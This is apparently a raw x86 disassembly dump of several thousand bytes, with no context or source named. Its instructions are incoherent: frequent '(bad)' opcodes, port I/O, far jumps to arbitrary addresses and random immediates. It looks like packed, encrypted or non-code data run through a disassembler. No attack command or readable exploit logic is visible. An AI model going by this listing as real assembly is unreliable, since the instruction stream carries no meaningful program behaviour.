  41cc09:	sub    edi,DWORD PTR [ebp-0x3c]
  41cc0c:	sbb    al,0x69
  41cc0e:	inc    edi
  41cc0f:	cmp    BYTE PTR [edi+0x70],cl
  41cc12:	mov    edx,0x9475d582
  41cc17:	in     eax,0x71
  41cc19:	pop    ebx
  41cc1a:	lock adc eax,0x42c2c4da
  41cc20:	cmp    eax,0xeeb64588
  41cc25:	xchg   BYTE PTR es:[edx],bh
  41cc28:	out    0x8d,al
  41cc2a:	push   ecx
  41cc2b:	stos   BYTE PTR es:[edi],al
  41cc2c:	dec    esp
  41cc2d:	xchg   ebp,eax
  41cc2e:	jae    0x41ccaa
  41cc30:	add    DWORD PTR [eax+0x7aac4087],ebp
  41cc36:	inc    edi
  41cc37:	fxch   st(1)
  41cc39:	ins    DWORD PTR es:[edi],dx
  41cc3a:	shl    al,cl
  41cc3c:	xor    bh,ch
  41cc3e:	dec    edi
  41cc3f:	int    0x3b
  41cc41:	add    al,BYTE PTR [ebp+0x4dcecd2f]
  41cc47:	test   DWORD PTR [edx+0x3270d59],ecx
  41cc4d:	add    al,0x28
  41cc4f:	into   
  41cc50:	int3   
  41cc51:	out    0xc2,eax
  41cc53:	xchg   DWORD PTR [edx+0x6c61fdfa],ebx
  41cc59:	nop
  41cc5a:	push   esp
  41cc5b:	retf   0x8d36
  41cc5e:	xchg   ebx,eax
  41cc5f:	repz jae 0x41cc4e
  41cc62:	ins    DWORD PTR es:[edi],dx
  41cc63:	fs in  al,0x6e
  41cc66:	mov    bl,0xce
  41cc68:	popf   
  41cc69:	jg     0x41cc56
  41cc6b:	cmp    cl,cl
  41cc6d:	aad    0xff
  41cc6f:	loop   0x41cca7
  41cc71:	xchg   edx,eax
  41cc72:	fwait
  41cc73:	mov    ds:0xfea1e0ce,al
  41cc78:	jl     0x41ccd3
  41cc7a:	in     eax,dx
  41cc7b:	icebp  
  41cc7c:	aas    
  41cc7d:	cli    
  41cc7e:	sbb    cl,BYTE PTR [ebx+0x70]
  41cc81:	pop    ds
  41cc82:	jmp    0xfbb110b8
  41cc87:	test   al,0x8e
  41cc89:	cmc    
  41cc8a:	cmp    BYTE PTR [esi],bl
  41cc8c:	outs   dx,DWORD PTR ds:[esi]
  41cc8d:	sahf   
  41cc8e:	leave  
  41cc8f:	mov    ebp,0x29cbc423
  41cc94:	mov    al,ds:0x22ee5611
  41cc99:	ins    BYTE PTR es:[edi],dx
  41cc9a:	or     edi,eax
  41cc9c:	xchg   esp,eax
  41cc9d:	mov    dh,0xd4
  41cc9f:	pop    es
  41cca0:	out    0x73,eax
  41cca2:	add    BYTE PTR [ebx-0x109044a5],0x73
  41cca9:	fimul  WORD PTR [ebp+0x79]
  41ccac:	fdiv   DWORD PTR [eax]
  41ccae:	lods   eax,DWORD PTR ds:[esi]
  41ccaf:	in     eax,dx
  41ccb0:	adc    BYTE PTR [esi+0x51c38ca0],bh
  41ccb6:	add    ebp,ebp
  41ccb8:	outs   dx,BYTE PTR ds:[esi]
  41ccb9:	enter  0x649b,0x82
  41ccbd:	frstor [eax-0x75]
  41ccc0:	lods   eax,DWORD PTR ds:[esi]
  41ccc1:	sub    ecx,DWORD PTR [ecx+0x1a04877]
  41ccc7:	mov    ebx,0xe795960c
  41cccc:	and    dl,BYTE PTR [edx-0x34]
  41cccf:	rcpps  xmm7,XMMWORD PTR [edx+0x2a513a23]
  41ccd6:	xchg   esp,eax
  41ccd7:	sub    DWORD PTR [esi-0x79779889],0x7422f82
  41cce1:	jecxz  0x41cc93
  41cce3:	fisubr WORD PTR [edi]
  41cce5:	mov    es,ebp
  41cce7:	sbb    al,0xcd
  41cce9:	add    al,BYTE PTR [ebx-0xc]
  41ccec:	adc    BYTE PTR [ebx+ebp*1],0x3f
  41ccf0:	dec    eax
  41ccf1:	adc    BYTE PTR [ecx+0x7d],0xf5
  41ccf5:	call   0x245f:0xbcd6
  41ccfb:	lock mov bh,0x7a
  41ccfe:	inc    ebp
  41ccff:	leave  
  41cd00:	shr    cl,1
  41cd02:	xor    cl,BYTE PTR [edi]
  41cd04:	stos   DWORD PTR es:[edi],eax
  41cd05:	dec    ebp
  41cd06:	call   0xa1a9a12a
  41cd0b:	scas   eax,DWORD PTR es:[edi]
  41cd0c:	push   edi
  41cd0d:	cmp    edx,DWORD PTR [eax-0x4d]
  41cd10:	add    eax,0x11f7015d
  41cd15:	call   0xf32114d2
  41cd1a:	xchg   edx,eax
  41cd1b:	(bad)  
  41cd1c:	les    esi,FWORD PTR [edi]
  41cd1e:	xor    DWORD PTR [esp+eax*4-0x498d1ee3],0xaa941b5e
  41cd29:	jle    0x41ccb0
  41cd2b:	cs loope 0x41ccb0
  41cd2e:	outs   dx,DWORD PTR ds:[esi]
  41cd2f:	jb     0x41cd9a
  41cd31:	mov    bh,0xf2
  41cd33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd34:	sub    al,bl
  41cd36:	fucomi st,st(2)
  41cd38:	add    DWORD PTR ds:0x9fa44e91,edx
  41cd3e:	stos   DWORD PTR es:[edi],eax
  41cd3f:	les    eax,FWORD PTR [edx+0x55ffe074]
  41cd45:	sbb    eax,0x608c02dd
  41cd4a:	cmp    bl,BYTE PTR [ecx+0x70]
  41cd4d:	sahf   
  41cd4e:	cmc    
  41cd4f:	je     0x41ccfe
  41cd51:	pop    edx
  41cd52:	daa    
  41cd53:	je     0x41ccd5
  41cd55:	inc    esi
  41cd56:	and    eax,DWORD PTR [edi-0x4b994c1d]
  41cd5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd5d:	les    ecx,FWORD PTR [eiz*1+0xedca9a3]
  41cd64:	imul   esp
  41cd66:	pop    esp
  41cd67:	adc    eax,0x2b61b226
  41cd6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd6d:	nop/reserved BYTE PTR [edx-0x68]
  41cd71:	mov    ah,0x15
  41cd73:	add    DWORD PTR [edi-0x22c0cee1],esp
  41cd79:	cld    
  41cd7a:	cmp    eax,ebp
  41cd7c:	xor    BYTE PTR [esi-0x78514296],cl
  41cd82:	xor    al,0x8
  41cd84:	dec    edx
  41cd85:	sub    ah,BYTE PTR [esi-0x792a375]
  41cd8b:	aad    0x7a
  41cd8d:	mov    ds:0x2326ced7,eax
  41cd92:	mov    esi,0x199d05e2
  41cd97:	adc    BYTE PTR [esi],dh
  41cd99:	or     DWORD PTR [esi-0x6b75f965],esi
  41cd9f:	dec    ebp
  41cda0:	jmp    0x2d0ba8aa
  41cda5:	jmp    0x8f86:0x3221c28b
  41cdac:	sub    BYTE PTR [eax-0x9],cl
  41cdaf:	out    0x28,eax
  41cdb1:	dec    edi
  41cdb2:	hlt    
  41cdb3:	(bad)  
  41cdb4:	ror    DWORD PTR [ebp+0x2e628594],cl
  41cdba:	call   0xb416e522
  41cdbf:	fisub  DWORD PTR [eax+0x1]
  41cdc2:	push   esp
  41cdc3:	mov    ds:0x9fe80500,eax
  41cdc8:	push   ecx
  41cdc9:	jbe    0x41cd6f
  41cdcb:	xchg   BYTE PTR ds:0x9b28a5cf,ch
  41cdd1:	dec    esi
  41cdd2:	cmp    DWORD PTR [bx+si+0x2e19],esp
  41cdd7:	adc    DWORD PTR [esi+0x69],0x7e
  41cddb:	imul   ebx,esi,0x782007cd
  41cde1:	pop    ss
  41cde2:	out    0xfd,eax
  41cde4:	mov    al,0x9a
  41cde6:	jmp    0x41ce45
  41cde8:	pop    edi
  41cde9:	mov    cl,0x49
  41cdeb:	aas    
  41cdec:	gs xchg ecx,eax
  41cdee:	stc    
  41cdef:	xor    eax,DWORD PTR [ecx+0xc]
  41cdf2:	shl    BYTE PTR [esi+0x4],cl
  41cdf5:	sahf   
  41cdf6:	test   al,0xc7
  41cdf8:	mov    dl,BYTE PTR [esi+edi*1]
  41cdfb:	xchg   BYTE PTR [ebp-0x42],bl
  41cdfe:	adc    BYTE PTR [esi-0x5e],cl
  41ce01:	jnp    0x41ce63
  41ce03:	dec    edx
  41ce04:	and    DWORD PTR [edi+ecx*8+0x35],edi
  41ce08:	inc    edi
  41ce09:	sbb    DWORD PTR [ecx],eax
  41ce0b:	das    
  41ce0c:	dec    eax
  41ce0d:	daa    
  41ce0e:	xor    BYTE PTR [eiz*8+0x5562fe88],bl
  41ce15:	out    dx,eax
  41ce16:	arpl   WORD PTR [ebp-0x7bc6e014],ax
  41ce1c:	daa    
  41ce1d:	pop    eax
  41ce1e:	loope  0x41cdca
  41ce20:	mov    eax,ds:0x7433cb0b
  41ce25:	adc    BYTE PTR [edi-0x3354346e],ah
  41ce2b:	loop   0x41cdf4
  41ce2d:	pop    esp
  41ce2e:	stos   BYTE PTR es:[edi],al
  41ce2f:	fisttp DWORD PTR [ebx+0x39be2272]
  41ce35:	push   ds
  41ce36:	int3   
  41ce37:	xchg   edx,eax
  41ce38:	push   es
  41ce39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce3a:	clc    
  41ce3b:	xor    eax,DWORD PTR [eax-0x10b6fbb8]
  41ce41:	add    DWORD PTR [ecx],edi
  41ce43:	jmp    FWORD PTR [ecx]
  41ce45:	lods   al,BYTE PTR ds:[esi]
  41ce46:	loop   0x41ce31
  41ce48:	mov    al,ds:0xbe792078
  41ce4d:	inc    ebp
  41ce4e:	ficom  DWORD PTR [ecx+0x42]
  41ce51:	mov    ah,0x8f
  41ce53:	out    dx,eax
  41ce54:	mov    WORD PTR [edx+0x13],fs
  41ce57:	iret   
  41ce58:	cmp    dl,0xe6
  41ce5b:	push   0x32f66c3d
  41ce60:	xor    DWORD PTR [ebx-0x7a46cd8],edi
  41ce66:	jmp    0x41ce6e
  41ce68:	in     al,dx
  41ce69:	mov    eax,0x2b2f0998
  41ce6e:	pop    ebp
  41ce6f:	outs   dx,BYTE PTR ds:[esi]
  41ce70:	js     0x41ceb0
  41ce72:	cwde   
  41ce73:	dec    edi
  41ce74:	(bad)
  41ce77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce78:	sub    ah,BYTE PTR [edi]
  41ce7a:	aaa    
  41ce7b:	push   0x7b
  41ce7d:	mov    ebx,0x89dfab8e
  41ce82:	pop    ss
  41ce83:	mov    edi,edi
  41ce85:	cli    
  41ce86:	push   ecx
  41ce87:	jecxz  0x41ceae
  41ce89:	dec    ebx
  41ce8a:	add    esi,DWORD PTR ds:0xbc099cd7
  41ce90:	or     DWORD PTR [edx-0x2b],ecx
  41ce93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce94:	(bad)  
  41ce95:	nop
  41ce96:	cmc    
  41ce97:	aas    
  41ce98:	add    eax,0xb5f93a8d
  41ce9d:	inc    esi
  41ce9e:	mov    al,0x27
  41cea0:	push   cs
  41cea1:	mov    esi,0x225671b2
  41cea6:	aam    0xcb
  41cea8:	pop    ds
  41cea9:	(bad)  
  41ceaa:	mov    dl,0x6
  41ceac:	inc    esp
  41cead:	pop    esp
  41ceae:	xor    DWORD PTR [edx+0x57],ebp
  41ceb1:	shl    DWORD PTR [eax+0x70],1
  41ceb4:	sub    ebx,DWORD PTR ds:0x4b544a6d
  41ceba:	adc    al,0x96
  41cebc:	jne    0x41cf24
  41cebe:	sbb    al,0x50
  41cec0:	add    ah,dh
  41cec2:	mov    ds:0x373200a6,eax
  41cec7:	sub    eax,0x1bbc0218
  41cecc:	sub    al,0xf1
  41cece:	adc    eax,0xf582f581
  41ced3:	jae    0x41cf48
  41ced5:	(bad)  
  41ced6:	test   al,0x70
  41ced8:	cmp    dl,BYTE PTR [ebp+0x38a80f49]
  41cede:	stos   WORD PTR es:[edi],ax
  41cee0:	dec    edx
  41cee1:	scas   al,BYTE PTR es:[edi]
  41cee2:	push   eax
  41cee3:	push   sp
  41cee5:	push   ss
  41cee6:	add    DWORD PTR [esi-0x2a07ca3e],0x62
  41ceed:	or     eax,0x9e83bd9
  41cef2:	ins    DWORD PTR es:[edi],dx
  41cef3:	push   edi
  41cef4:	xor    dl,BYTE PTR [esi]
  41cef6:	sbb    DWORD PTR ss:[eax+0x6],esi
  41cefa:	dec    esi
  41cefb:	(bad)  
  41cefc:	imul   ebx,ecx,0xffffffc1
  41ceff:	pusha  
  41cf00:	and    cl,al
  41cf02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf03:	or     ah,dh
  41cf05:	mov    al,ds:0x822151cb
  41cf0a:	inc    ebp
  41cf0b:	retf   0x1f74
  41cf0e:	mov    ds:0x18547ac7,al
  41cf13:	lea    ebp,[ecx+0x5]
  41cf16:	mov    dl,BYTE PTR [edi+0x4ad5c79f]
  41cf1c:	icebp  
  41cf1d:	dec    ebp
  41cf1e:	stc    
  41cf1f:	cmp    edi,DWORD PTR cs:[ebp-0x45b8f3a3]
  41cf26:	jno    0x41cee0
  41cf28:	push   cs
  41cf29:	push   ecx
  41cf2a:	mov    bl,0x7
  41cf2c:	icebp  
  41cf2d:	push   0x3de3dcb9
  41cf32:	jl     0x41ced1
  41cf34:	jb     0x41cf35
  41cf36:	cdq    
  41cf37:	ins    DWORD PTR es:[edi],dx
  41cf38:	pop    ecx
  41cf39:	add    BYTE PTR [di-0x27bf],al
  41cf3e:	gs jb  0x41cf6a
  41cf41:	mov    esp,0xb4276bd9
  41cf46:	adc    DWORD PTR [edx-0x7656c25a],esp
  41cf4c:	jns    0x41ceef
  41cf4e:	push   ecx
  41cf4f:	dec    DWORD PTR [edx+0x62]
  41cf52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf53:	fadd   DWORD PTR [edx-0x57]
  41cf56:	sub    BYTE PTR [ecx-0x76],dh
  41cf59:	out    0x6e,al
  41cf5b:	or     dh,bl
  41cf5d:	stc    
  41cf5e:	mov    al,ds:0xaf64e3e8
  41cf63:	pop    ds
  41cf64:	into   
  41cf65:	push   ebx
  41cf66:	js     0x41cf69
  41cf68:	jl     0x41cf12
  41cf6a:	pop    ebx
  41cf6b:	dec    eax
  41cf6c:	pop    edx
  41cf6d:	push   ss
  41cf6e:	data16 mov al,0xc9
  41cf71:	mov    bl,BYTE PTR [ebx+0x16]
  41cf74:	fcom   QWORD PTR [ebx-0x5307e597]
  41cf7a:	and    eax,0xa645eb45
  41cf7f:	rcr    DWORD PTR [ebx],0xf
  41cf82:	and    eax,0xefd419eb
  41cf87:	add    dl,BYTE PTR [eax]
  41cf89:	push   es
  41cf8a:	fs aad 0x23
  41cf8d:	add    bl,BYTE PTR [esi-0x2b]
  41cf90:	jl     0x41cf1e
  41cf92:	call   0xcaf1:0xbeee83cd
  41cf99:	pop    edi
  41cf9a:	xor    DWORD PTR ds:0xf4bd6630,esi
  41cfa0:	pushf  
  41cfa1:	jne    0x41cfb5
  41cfa3:	or     al,0x86
  41cfa5:	xchg   edx,eax
  41cfa6:	xor    esp,eax
  41cfa8:	outs   dx,DWORD PTR ds:[esi]
  41cfa9:	sbb    eax,0xd2b2f469
  41cfae:	cmp    eax,0x64d60beb
  41cfb3:	aaa    
  41cfb4:	jns    0x41cf84
  41cfb6:	imul   ebx,esi,0xffffffa3
  41cfb9:	sub    ebp,DWORD PTR [edx+0x25]
  41cfbc:	xor    ch,BYTE PTR [ebx-0x20c90639]
  41cfc2:	(bad)  
  41cfc3:	cs push esp
  41cfc5:	aaa    
  41cfc6:	add    eax,ebx
  41cfc8:	xlat   BYTE PTR ds:[ebx]
  41cfc9:	(bad)  [ebx-0x1a1f5c2d]
  41cfcf:	xor    BYTE PTR [ecx],ch
  41cfd1:	(bad)  
  41cfd2:	lock ret 0x6387
  41cfd6:	in     al,dx
  41cfd7:	xchg   esp,eax
  41cfd8:	mov    esp,DWORD PTR [edi+0x11]
  41cfdb:	mov    edx,0xacddd9a7
  41cfe0:	neg    DWORD PTR [edi]
  41cfe2:	dec    edi
  41cfe3:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41cfe5:	or     BYTE PTR [edi+edi*8],bh
  41cfe8:	fs out dx,al
  41cfea:	lea    ebp,[edi]
  41cfec:	jp     0x41d03a
  41cfee:	mov    edx,0xdac9b577
  41cff3:	leave  
  41cff4:	lahf   
  41cff5:	push   0xffffffb1
  41cff7:	xchg   edx,eax
  41cff8:	add    al,ch
  41cffa:	scas   eax,DWORD PTR es:[edi]
  41cffb:	xlat   BYTE PTR ds:[ebx]
  41cffc:	mov    ebx,0xe516b4f1
  41d001:	sub    DWORD PTR ds:0xd030b6b2,0xffffffb4
  41d008:	scas   al,BYTE PTR es:[edi]
  41d009:	mov    edi,0xa551fd8c
  41d00e:	fisubr DWORD PTR [ebx+0xa3ebfbe]
  41d014:	lock inc eax
  41d016:	arpl   WORD PTR [edi+ebx*1-0x5e],bx
  41d01a:	imul   ecx,DWORD PTR [ebp-0x45],0x7b
  41d01e:	scas   al,BYTE PTR es:[edi]
  41d01f:	cmp    al,0xe2
  41d021:	cmc    
  41d022:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d023:	mul    cl
  41d025:	ret    
  41d026:	aad    0xb5
  41d028:	lahf   
  41d029:	mov    ds:0xd5f71541,eax
  41d02e:	ret    
  41d02f:	daa    
  41d030:	mov    ch,BYTE PTR [eax]
  41d032:	push   es
  41d033:	cld    
  41d034:	mov    ecx,0xb13893d1
  41d039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d03a:	dec    edx
  41d03b:	pextrw edx,(bad),0xc5
  41d03d:	push   edx
  41d03e:	fcom   DWORD PTR [edx+eax*1-0x1dabe32]
  41d045:	jno    0x41d060
  41d047:	cli    
  41d048:	sbb    al,0xed
  41d04a:	rcr    DWORD PTR [ecx-0x1913a30c],0x15
  41d051:	mov    BYTE PTR [ebp-0x11],bl
  41d054:	mov    eax,ds:0xbc4679ad
  41d059:	or     al,0x90
  41d05b:	jae    0x41d00b
  41d05d:	stc    
  41d05e:	fidiv  DWORD PTR [ebx]
  41d060:	sub    ch,BYTE PTR [esi-0x7b]
  41d063:	lods   al,BYTE PTR ds:[esi]
  41d064:	and    al,0x35
  41d066:	aas    
  41d067:	add    al,0x5
  41d069:	cli    
  41d06a:	sub    ebp,DWORD PTR [ecx+edi*4]
  41d06d:	aad    0x16
  41d06f:	cmp    ecx,ecx
  41d071:	xlat   BYTE PTR ds:[ebx]
  41d072:	loope  0x41d057
  41d074:	jns    0x41d031
  41d076:	test   DWORD PTR [ecx-0x3c],eax
  41d079:	xchg   ecx,eax
  41d07a:	xchg   ecx,eax
  41d07b:	imul   esp,DWORD PTR [ebp-0x80],0x58
  41d07f:	retf   
  41d080:	das    
  41d081:	and    BYTE PTR [edi-0x12c68a16],bl
  41d087:	mov    al,0xa3
  41d089:	mov    edi,0x6d6dc7d3
  41d08e:	leave  
  41d08f:	pop    ds
  41d090:	ja     0x41d064
  41d092:	cmp    BYTE PTR [eax+esi*2],ch
  41d095:	and    eax,0xdfb4df21
  41d09a:	(bad)  
  41d09b:	push   ds
  41d09c:	push   edx
  41d09d:	(bad)  
  41d09e:	dec    esp
  41d09f:	xor    bl,0xa4
  41d0a2:	xor    eax,0xd3b59d90
  41d0a7:	and    cl,ch
  41d0a9:	or     edi,DWORD PTR [eax-0x3]
  41d0ac:	sbb    bl,BYTE PTR [ecx]
  41d0ae:	cs push ecx
  41d0b0:	mov    BYTE PTR [ecx-0x64],ah
  41d0b3:	out    0xc9,eax
  41d0b5:	fadd   DWORD PTR ds:0x92cfb458
  41d0bb:	aad    0xbf
  41d0bd:	cld    
  41d0be:	lods   al,BYTE PTR ds:[esi]
  41d0bf:	loopne 0x41d079
  41d0c1:	mov    dh,0x7b
  41d0c3:	nop
  41d0c4:	rol    DWORD PTR [ecx-0x71],1
  41d0c7:	lock mov eax,0xad93e8e1
  41d0cd:	sbb    DWORD PTR [esi+eiz*2],edi
  41d0d0:	stc    
  41d0d1:	test   BYTE PTR [esi],bh
  41d0d3:	gs mov ebp,0x2bea0756
  41d0d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d0da:	nop
  41d0db:	popa   
  41d0dc:	lods   al,BYTE PTR ds:[esi]
  41d0dd:	jns    0x41d0b2
  41d0df:	inc    ebx
  41d0e0:	add    ebx,DWORD PTR [esi+0x21d2c374]
  41d0e6:	jnp    0x41d0f0
  41d0e8:	icebp  
  41d0e9:	sub    BYTE PTR [eax],ah
  41d0eb:	mov    esp,0xedb840a6
  41d0f0:	pop    edi
  41d0f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0f2:	jl     0x41d076
  41d0f4:	cmc    
  41d0f5:	mov    ecx,0x19fb734f
  41d0fa:	and    dh,BYTE PTR [edx]
  41d0fc:	mov    ah,BYTE PTR [ecx+0x454762b1]
  41d102:	jne    0x41d0eb
  41d104:	inc    esi
  41d105:	scas   eax,DWORD PTR es:[edi]
  41d106:	mov    ch,0x12
  41d108:	stc    
  41d109:	in     eax,dx
  41d10a:	es push esp
  41d10c:	dec    BYTE PTR [eax]
  41d10e:	mov    ah,0x77
  41d110:	jo     0x41d09a
  41d112:	push   esi
  41d113:	add    al,0x30
  41d115:	ficom  DWORD PTR [edx-0x2a900f6c]
  41d11b:	jmp    0x10a0:0x4ccb5b8e
  41d122:	xor    BYTE PTR [ebx],0x8f
  41d125:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d126:	mov    cl,0xa2
  41d128:	inc    ecx
  41d129:	iret   
  41d12a:	outs   dx,DWORD PTR ds:[esi]
  41d12b:	outs   dx,BYTE PTR ds:[esi]
  41d12c:	ja     0x41d0c5
  41d12e:	xchg   ebx,eax
  41d12f:	ret    0x1242
  41d132:	push   esp
  41d133:	sahf   
  41d134:	fisttp QWORD PTR [eax-0xc]
  41d137:	xchg   ebx,eax
  41d138:	adc    eax,0xb030ce75
  41d13d:	xor    ah,BYTE PTR [ebx+edi*4+0x46]
  41d141:	aad    0x51
  41d143:	add    DWORD PTR [edx+0xc740080],esp
  41d149:	or     dh,bh
  41d14b:	retf   
  41d14c:	push   ebp
  41d14d:	fs xchg ebp,eax
  41d14f:	sbb    BYTE PTR [eax+0x23],dl
  41d152:	(bad)  
  41d154:	mov    ah,0x3b
  41d156:	lods   eax,DWORD PTR ds:[esi]
  41d157:	xchg   ecx,eax
  41d158:	test   bh,0xd8
  41d15b:	ins    BYTE PTR es:[edi],dx
  41d15c:	xor    dh,ch
  41d15e:	ss jg  0x41d1ae
  41d161:	cmpxchg DWORD PTR [ecx-0x51c31718],eax
  41d168:	add    ch,BYTE PTR [ebp-0x34]
  41d16b:	das    
  41d16c:	call   0x36ff7dbf
  41d171:	mov    WORD PTR [edi+0x7e59113b],es
  41d177:	adc    al,0x26
  41d179:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d17a:	rcl    DWORD PTR [edi-0x73f572e2],0x58
  41d181:	jle    0x41d1e0
  41d183:	push   cs
  41d184:	(bad)  
  41d185:	jo     0x41d166
  41d187:	inc    dl
  41d189:	inc    esp
  41d18a:	ja     0x41d19e
  41d18c:	xor    BYTE PTR [ebp+ebx*2+0x63],bl
  41d190:	mov    edi,0x7b65a438
  41d195:	rol    DWORD PTR [ebx],1
  41d197:	scas   eax,DWORD PTR es:[edi]
  41d198:	sbb    dh,BYTE PTR [eax-0x7d759b2f]
  41d19e:	jmp    DWORD PTR [ebp-0x3c]
  41d1a1:	mov    eax,ds:0x98e29239
  41d1a6:	sahf   
  41d1a7:	inc    eax
  41d1a8:	mov    edx,0x8a3fe766
  41d1ad:	cli    
  41d1ae:	adc    BYTE PTR [ebx+0x53],bl
  41d1b1:	mov    BYTE PTR [ebx],bh
  41d1b3:	dec    edx
  41d1b4:	or     BYTE PTR [esi+eiz*2],bh
  41d1b7:	pop    ebp
  41d1b8:	mov    DWORD PTR ds:0xbe53fa32,ebx
  41d1be:	in     eax,dx
  41d1bf:	outs   dx,DWORD PTR ds:[esi]
  41d1c0:	mov    al,ds:0x6ed71cba
  41d1c5:	sub    eax,0xe739c725
  41d1ca:	outs   dx,DWORD PTR ds:[esi]
  41d1cb:	test   BYTE PTR [edx+0x7cdb9e7c],ah
  41d1d1:	fneni(8087 only) 
  41d1d3:	pop    edx
  41d1d4:	(bad)  
  41d1d5:	sub    al,0x6f
  41d1d7:	xchg   ebx,eax
  41d1d8:	mov    al,ds:0x8deec928
  41d1dd:	xchg   ebx,eax
  41d1de:	xchg   BYTE PTR [ecx-0x53],bl
  41d1e1:	dec    esi
  41d1e2:	fcomp  QWORD PTR [edi]
  41d1e4:	int    0x6c
  41d1e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1e7:	xchg   DWORD PTR [edx-0x2f],esp
  41d1ea:	xchg   DWORD PTR [esi],ecx
  41d1ec:	and    ah,ch
  41d1ee:	int3   
  41d1ef:	sub    bl,dh
  41d1f1:	ror    DWORD PTR [edx+0x6c],0xdd
  41d1f5:	inc    eax
  41d1f6:	pop    eax
  41d1f7:	sub    al,0x53
  41d1f9:	jno    0x41d256
  41d1fb:	aaa    
  41d1fc:	mov    bl,BYTE PTR [ebx+0x33]
  41d1ff:	push   edi
  41d200:	jmp    0x69f58fbe
  41d205:	cmp    dl,BYTE PTR [edi+esi*2+0x611303e0]
  41d20c:	dec    edi
  41d20d:	push   cs
  41d20e:	(bad)  
  41d20f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d210:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  41d212:	inc    ecx
  41d213:	inc    esi
  41d214:	sub    DWORD PTR [ebp+0x3db84a9a],ebx
  41d21a:	jne    0x41d28e
  41d21c:	lods   eax,DWORD PTR ds:[esi]
  41d21d:	jbe    0x41d28c
  41d21f:	mov    ebx,0x4833f62b
  41d224:	dec    ecx
  41d225:	xor    eax,0xc04e250f
  41d22a:	bound  edx,QWORD PTR [ebp-0x52]
  41d22d:	add    ecx,DWORD PTR [eax+0x1]
  41d230:	scas   eax,DWORD PTR es:[edi]
  41d231:	mov    al,ds:0x6021c0b6
  41d236:	aad    0xa0
  41d238:	cmp    eax,0x89d85197
  41d23d:	dec    edx
  41d23e:	xchg   edx,eax
  41d23f:	(bad)  
  41d240:	ja     0x41d22e
  41d242:	pop    es
  41d243:	retf   0x17c4
  41d246:	and    al,0x27
  41d248:	loop   0x41d29b
  41d24a:	add    DWORD PTR [esi],ebx
  41d24c:	sbb    eax,0x89f10a3c
  41d251:	shl    DWORD PTR [edx-0x53565033],0x76
  41d258:	sbb    DWORD PTR [esi+0x4d479c48],ebp
  41d25e:	imul   esi,DWORD PTR [edx-0xf0a49d0],0x53470ba0
  41d268:	jns    0x41d27c
  41d26a:	repz mov ebx,0x6b02e9aa
  41d270:	mov    al,0xb4
  41d272:	mov    bh,BYTE PTR [esi-0x70976ddb]
  41d278:	aaa    
  41d279:	jb     0x41d2d3
  41d27b:	mov    dh,0xd4
  41d27d:	cmp    eax,0x63c8f83d
  41d282:	fwait
  41d283:	dec    ebp
  41d284:	xchg   BYTE PTR [ecx-0x608b52dc],ch
  41d28a:	inc    DWORD PTR [ebx-0x47caec4f]
  41d290:	loop   0x41d273
  41d292:	cli    
  41d293:	mov    ecx,0x70b8d3bd
  41d298:	dec    edx
  41d299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d29a:	jecxz  0x41d26d
  41d29c:	(bad)  
  41d29d:	es adc bh,bl
  41d2a0:	xor    esi,0xffffff82
  41d2a3:	pop    edx
  41d2a4:	adc    esi,ecx
  41d2a6:	jge    0x41d293
  41d2a8:	jbe    0x41d292
  41d2aa:	jmp    0x41d24f
  41d2ac:	inc    edi
  41d2ad:	je     0x41d27a
  41d2af:	stos   BYTE PTR es:[edi],al
  41d2b0:	scas   al,BYTE PTR es:[edi]
  41d2b1:	mov    ds:0xccbb5be2,eax
  41d2b6:	cmp    BYTE PTR [esi+ecx*4+0x5f],bh
  41d2ba:	mov    ebx,0xa774cc24
  41d2bf:	pop    ebx
  41d2c0:	push   es
  41d2c1:	(bad)  
  41d2c2:	stc    
  41d2c3:	ins    BYTE PTR es:[edi],dx
  41d2c4:	cmp    ebp,DWORD PTR ds:0x556c2f1d
  41d2ca:	cdq    
  41d2cb:	(bad)  
  41d2cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2cd:	push   es
  41d2ce:	or     eax,0xcd058b53
  41d2d3:	int    0x20
  41d2d5:	mov    esp,0xa06fe99d
  41d2da:	aas    
  41d2db:	pop    es
  41d2dc:	rcr    DWORD PTR [ebx+0x3747d54f],cl
  41d2e2:	push   ebp
  41d2e3:	ins    DWORD PTR es:[edi],dx
  41d2e4:	mov    DWORD PTR [edi-0x5cf26f0d],eax
  41d2ea:	or     DWORD PTR [ecx+esi*2],edx
  41d2ed:	test   BYTE PTR [edi+0x2bb9b34e],bl
  41d2f3:	in     eax,dx
  41d2f4:	fcomp  DWORD PTR [ebp-0x30]
  41d2f7:	ror    DWORD PTR [ebx-0x42],1
  41d2fa:	cmp    edx,DWORD PTR [ecx+edi*8-0x5d5c2e3a]
  41d301:	retf   
  41d302:	fnstsw WORD PTR [edx]
  41d304:	popa   
  41d305:	(bad)  
  41d306:	out    dx,al
  41d307:	mov    ch,BYTE PTR [esi]
  41d309:	retf   0xe74b
  41d30c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d30d:	out    0x46,al
  41d30f:	push   ebx
  41d310:	fwait
  41d311:	imul   esp,DWORD PTR [esi-0x1e150da4],0x14
  41d318:	xor    eax,0x4fcdfe51
  41d31d:	sbb    dh,BYTE PTR [edi-0x79]
  41d320:	mov    al,0xe3
  41d322:	(bad)  
  41d323:	int3   
  41d324:	sbb    BYTE PTR [edi+0x23c4960d],ch
  41d32a:	aas    
